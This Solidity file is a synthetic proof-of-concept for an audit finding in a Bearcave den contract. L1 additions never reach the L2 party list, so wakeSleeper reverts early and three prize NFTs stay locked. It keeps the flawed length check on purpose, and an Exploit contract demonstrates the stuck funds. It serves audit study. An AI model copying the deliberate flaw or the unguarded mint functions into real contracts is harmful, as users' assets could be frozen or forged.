// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Bearcave HibernationDen — L2 party.sleepoors is never extended (Pashov, 2023-06, C-01).
    SYNTHETIC, cheatcode-free. One chain models the L2 den. The L1 add is local and
    sends no message. Vulnerable check preserved verbatim (@> VULN).

    L2 was synced with 7 sleepers. addToParty pushes 3 more on L1 only.
    wakeSleeper pays the first 7 prizes, then reverts PartyAlreadyWoke.
    N = 3 prize NFTs, worth 300 PRIZE, stay in the den. */

contract Prize {
    string public name = "PRIZE";
    string public symbol = "PRIZE";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract SleeperNFT {
    mapping(uint256 => address) public ownerOf;

    function mint(address to, uint256 id) external {
        ownerOf[id] = to;
    }

    function transferFrom(address from, address to, uint256 id) external {
        require(ownerOf[id] == from, "from");
        require(msg.sender == from, "sender");
        ownerOf[id] = to;
    }
}

contract L1Den {
    uint256[] public sleepoors;

    function length() external view returns (uint256) {
        return sleepoors.length;
    }

    /// Audited addToParty pushes on L1 and does not message L2.
    function addToParty(uint256[] calldata ids) external {
        uint256 n = ids.length;
        for (uint256 i = 0; i < n; i++) {
            sleepoors.push(ids[i]);
        }
    }
}

contract L2Den {
    struct Party {
        uint256 numUsed;
        uint256[] sleepoors;
    }

    Prize public prize;
    SleeperNFT public nft;
    mapping(uint256 => Party) internal parties;
    mapping(uint256 => uint256) public prizeOf;
    uint256 public paidOut;

    constructor(Prize prize_, SleeperNFT nft_) {
        prize = prize_;
        nft = nft_;
    }

    function seed(uint256 bundleId, uint256 id, uint256 prizeAmt) external {
        parties[bundleId].sleepoors.push(id);
        prizeOf[id] = prizeAmt;
    }

    function hold(uint256 id, uint256 prizeAmt) external {
        prizeOf[id] = prizeAmt;
    }

    function numUsed(uint256 bundleId) external view returns (uint256) {
        return parties[bundleId].numUsed;
    }

    function sleeperCount(uint256 bundleId) external view returns (uint256) {
        return parties[bundleId].sleepoors.length;
    }

    error PartyAlreadyWoke(uint256 bundleId_);

    function wakeSleeper(uint256 bundleId_) external {
        Party storage party = parties[bundleId_];
        // @> VULN: L2 length was never updated, so numUsed == length bricks the rest
        if (party.numUsed == party.sleepoors.length) revert PartyAlreadyWoke(bundleId_);
        uint256 id = party.sleepoors[party.numUsed];
        party.numUsed += 1;
        uint256 amt = prizeOf[id];
        paidOut += amt;
        nft.transferFrom(address(this), msg.sender, id);
        prize.transfer(msg.sender, amt);
    }
}

contract L2DenFixed is L2Den {
    constructor(Prize prize_, SleeperNFT nft_) L2Den(prize_, nft_) {}

    function mirror(uint256 bundleId, uint256 id, uint256 prizeAmt) external {
        parties[bundleId].sleepoors.push(id);
        prizeOf[id] = prizeAmt;
    }
}

contract Exploit {
    uint256 public constant BUNDLE = 1;
    uint256 public constant EACH = 100 ether;
    uint256 public constant SYNCED = 7;
    uint256 public constant ADDED = 3;
    uint256 public constant STUCK = 3;
    uint256 public constant STUCK_PRIZE = 300 ether;

    Prize public prize; // nonce 1
    SleeperNFT public nft; // nonce 2
    L1Den public l1; // nonce 3
    L2Den public l2; // nonce 4

    uint256 public woken;
    uint256 public l1Length;
    uint256 public l2Length;
    bool public eighthReverted;
    uint256 public stuckOwnedByDen;
    uint256 public denPrizeLeft;
    uint256 public claimerPrize;

    constructor() {
        prize = new Prize();
        nft = new SleeperNFT();
        l1 = new L1Den();
        l2 = new L2Den(prize, nft);
    }

    function run() external {
        uint256 i;
        for (i = 1; i <= SYNCED; i++) {
            nft.mint(address(l2), i);
            l2.seed(BUNDLE, i, EACH);
        }
        uint256[] memory extra = new uint256[](ADDED);
        for (i = 0; i < ADDED; i++) {
            uint256 id = SYNCED + 1 + i;
            nft.mint(address(l2), id);
            l2.hold(id, EACH);
            extra[i] = id;
        }
        prize.mint(address(l2), EACH * (SYNCED + ADDED));
        l1.addToParty(extra);
        l1Length = l1.length();
        l2Length = l2.sleeperCount(BUNDLE);
        uint256 k;
        for (k = 0; k < SYNCED; k++) {
            l2.wakeSleeper(BUNDLE);
        }
        woken = l2.numUsed(BUNDLE);
        (bool ok,) = address(l2).call(abi.encodeWithSelector(l2.wakeSleeper.selector, BUNDLE));
        eighthReverted = !ok;
        uint256 id8 = SYNCED + 1;
        if (nft.ownerOf(id8) == address(l2)) stuckOwnedByDen += 1;
        if (nft.ownerOf(id8 + 1) == address(l2)) stuckOwnedByDen += 1;
        if (nft.ownerOf(id8 + 2) == address(l2)) stuckOwnedByDen += 1;
        denPrizeLeft = prize.balanceOf(address(l2));
        claimerPrize = prize.balanceOf(address(this));
        require(l1Length == ADDED, "l1 add");
        require(l2Length == SYNCED, "l2 stale");
        require(woken == SYNCED, "woken");
        require(eighthReverted, "eighth should revert");
        require(stuckOwnedByDen == STUCK, "N stuck");
        require(denPrizeLeft == STUCK_PRIZE, "300 stuck");
        require(claimerPrize == EACH * SYNCED, "7 paid");
    }
}
